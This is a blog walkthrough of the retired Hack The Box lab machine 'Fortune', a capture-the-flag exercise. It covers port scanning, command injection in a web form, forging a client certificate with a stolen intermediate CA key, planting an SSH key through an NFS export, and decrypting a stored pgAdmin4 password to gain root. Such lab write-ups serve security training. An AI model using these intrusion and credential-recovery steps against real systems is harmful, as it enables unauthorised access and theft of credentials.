---
layout: post
title: "Fortune: Hack The Box Walkthrough"
date: 2019-08-03 16:15:20 +0000
last_modified_at: 2019-08-03 16:35:07 +0000
category: Walkthrough
tags: ["Hack The Box", Fortune, retired]
comments: true
image:
  feature: fortune-htb-walkthrough.jpg
  credit: valentin_mtnezc / Pixabay
  creditlink: https://pixabay.com/photos/fortune-telling-tarot-letters-2458920/
---

This post documents the complete walkthrough of Fortune, a retired vulnerable [VM][1] created by [AuxSarge][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Fortune is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.127 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-11 00:47:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.127                                    
Discovered open port 22/tcp on 10.10.10.127                                    
Discovered open port 443/tcp on 10.10.10.127
```

`masscan` finds the three open ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p22,80,443 -A --reason -oN nmap.txt 10.10.10.127
...
PORT    STATE SERVICE    REASON         VERSION
22/tcp  open  ssh        syn-ack ttl 63 OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       syn-ack ttl 63 OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https? syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time
```

Feels good to be back in the Unix/Linux environment again. :wink: Let's start with the `http` service. This is how it looks like.


{% include image.html image_alt="9d5a00fc.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/9d5a00fc.png" %}


Let's select the `recipes` database and submit it. I got Burp switched on to capture the POST request.


{% include image.html image_alt="8faf9849.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/8faf9849.png" %}


The POST request is simple enough. What if we replicate this behavior with `wfuzz` and a bunch of weird characters?


{% include image.html image_alt="b7e1e97e.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/b7e1e97e.png" %}


I think we got command injection in our hands!


{% include image.html image_alt="f8b5f98b.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/f8b5f98b.png" %}


### Client-side SSL Certificate

I was very eager to run a reverse shell back but it seems the firewall is blocking outbound communications. During enumeration of the SSH configuration, I noticed the following.

```
Match User nfsuser
	AuthorizedKeysFile none
	AuthorizedKeysCommand /usr/local/bin/psql -Aqt -c "SELECT key from authorized_keys where uid = '%u';" authpf appsrv
	AuthorizedKeysCommandUser _sshauth
```

It seems like `authpf` is installed. According to the [FAQ](https://www.openbsd.org/faq/pf/authpf.html),

> The authpf(8) utility is a user shell for authenticating gateways. An authenticating gateway is just like a regular network gateway (also known as a router) except that users must first authenticate themselves to it before their traffic is allowed to pass through.

Somewhere further down the enumeration road, I also noticed the following listening ports but they didn't appear in the port scan.


{% include image.html image_alt="e7757165.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/e7757165.png" %}


Putting on my investigator's hat, I soon discovered the following `http` services.


{% include image.html image_alt="44e7166a.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/44e7166a.png" %}


A few more pieces of the puzzle tell me that everything points towards getting a client-side certificate signed:

+ The SSH key-pair generation code is at `/var/appsrv/sshauth/sshauthd.py`
+ The intermediate CA's certificate and key is present at `/home/bob/ca/intermediate`
+ The `/home` directory is exported via NFS.

_SSH key-pair generation and insertion into the database_


{% include image.html image_alt="61c0d32a.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/61c0d32a.png" %}


_Intermediate CA_


{% include image.html image_alt="9c7c032b.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/9c7c032b.png" %}


_The `/home` directory exported via NFS_


{% include image.html image_alt="fea384c7.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/fea384c7.png" %}


I made the initial mistake of thinking that I could insert my own public key (that I control) into the `authpf` database, and wasted precious time. All because I saw this.


{% include image.html image_alt="4e739432.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/4e739432.png" %}


See? `appsrv` can select, insert and update on `authpf`. Well, for consolation, `bob` can view the table `authorized_keys` without password. At least, I can tell if the generated public key and my IP address got inserted into the table or not.

...

Back to the main topic of accessing `https://fortune.htb/generate`, I need to generate a Certificate Signing Request (or CSR). Well, I can easily copy the Intermediate CA's certificate and private key from Burp.


{% include image.html image_alt="ec8a68ad.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/ec8a68ad.png" %}


_Generate my private key and CSR with OpenSSL_

```
# openssl genrsa -out me.key
# openssl req -new -key me.key -out me.csr
```

It doesn't matter what values I use for the CSR as long as I have the Intermediate CA vouching for my trust-worthiness with its certificate and key. :wink:

_Generate client certificate and signed by Intermediate CA_

```
# openssl x509 -req -in me.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out me.pem
```

I also need to combine my private key and my certificate to PKCS#12 format because that's what Firefox accepts without questioning.

```
# openssl pcks12 -export -out me.p12 -in me.pem -inkey me.key
```

Let's import my certificate into Firefox!

_Before import_


{% include image.html image_alt="153d3510.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/153d3510.png" %}


_After import_


{% include image.html image_alt="778fa8de.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/778fa8de.png" %}


Time to generate SSH key-pair for `nfsuser`.


{% include image.html image_alt="b8a3c8b5.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/b8a3c8b5.png" %}


Copy-and-paste the key-pair to `nfsuser` and `nfuser.pub` respectively and SSH-in to open the gateway.


{% include image.html image_alt="839a855b.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/839a855b.png" %}


Here's a new round of `nmap` scan results.

```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp   open  http       syn-ack ttl 63 OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
111/tcp  open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3         2049/tcp  nfs
|   100003  2,3         2049/udp  nfs
|   100005  1,3          756/udp  mountd
|_  100005  1,3         1012/tcp  mountd
443/tcp  open  ssl/https? syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time
1012/tcp open  mountd     syn-ack ttl 63 1-3 (RPC #100005)
2049/tcp open  nfs        syn-ack ttl 63 2-3 (RPC #100003)
8081/tcp open  http       syn-ack ttl 63 OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: pgadmin4
```

Awesome.

## Low-Privilege Shell

Since we can mount `/home` as anyone, let's mount it as `charlie` so that we can copy SSH public key we control (finally...) to `authorized_keys`.


{% include image.html image_alt="7c3794c2.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/7c3794c2.png" %}


And bam...we have a shell.


{% include image.html image_alt="e7f505a2.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/e7f505a2.png" %}


The `user.txt` is at the home directory of `charlie`.


{% include image.html image_alt="06b8f904.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/06b8f904.png" %}


## Privilege Escalation

During enumeration of `charlie`'s account, I notice `bob` has sent `charlie` an email.


{% include image.html image_alt="f4d5c74c.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/f4d5c74c.png" %}


It clearly stated that `bob` has set the `dba`'s password to `root`'s password. Seeing that drove me to hunt for `dba`'s password.

Long story short. The `dba`'s password to the PostgreSQL database is kept in  a SQLite3 database located at `/var/appsrv/pgadmin4/pgadmin4.db`.

If you look at this [code](https://github.com/postgres/pgadmin4/blob/c7b29d35aeaf1e16c9d83cbdfae8dd5e1a8a3443/web/pgadmin/utils/driver/psycopg2/connection.py#L257), you'll see that the decryption key is from the `user.password`, which can also be found in the SQLite3 database, `pgadmin4.db`.


{% include image.html image_alt="55af1e5f.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/55af1e5f.png" %}


The decrypt [function](https://github.com/postgres/pgadmin4/blob/c7b29d35aeaf1e16c9d83cbdfae8dd5e1a8a3443/web/pgadmin/utils/crypto.py#L51) is pretty simple.

```python
def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext\[:iv_size\]

    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext\[iv_size:\]) + decryptor.finalize()


def pad(key):
    """Add padding to the key."""

    if isinstance(key, six.text_type):
        key = key.encode()

    # Key must be maximum 32 bytes long, so take first 32 bytes
    key = key\[:32\]

    # If key size is 16, 24 or 32 bytes then padding is not required
    if len(key) in (16, 24, 32):
        return key

    # Add padding to make key 32 bytes long
    return key.ljust(32, padding_string)
```

The parameters are all in `pgadmin4.db`.

_Encrypted password_

{% include image.html image_alt="bf6f8d89.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/bf6f8d89.png" %}


_User's password hash as key_

{% include image.html image_alt="91f6c120.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/91f6c120.png" %}


Grab a copy of `crypto.py` from pgAdmin's GitHub [repository](https://github.com/postgres/pgadmin4) and append the following code to it.

```python
encpass = 'utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz'
bob = '$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg'
charlie = '$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ'

print decrypt(encpass, bob)
print decrypt(encpass, charlie)
```


{% include image.html image_alt="bc2d37e6.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/bc2d37e6.png" %}


I knew it. `bob` is the careless one. Armed with `root`'s password, we can `su` to gain a `root` shell and grab that `root.txt`.


{% include image.html image_alt="a5cf9bf7.png" image_src="/f78ca744-9671-4676-8293-6ddfaaf871bd/a5cf9bf7.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/178
[2]: https://www.hackthebox.eu/home/users/profile/46317
[3]: https://www.hackthebox.eu/
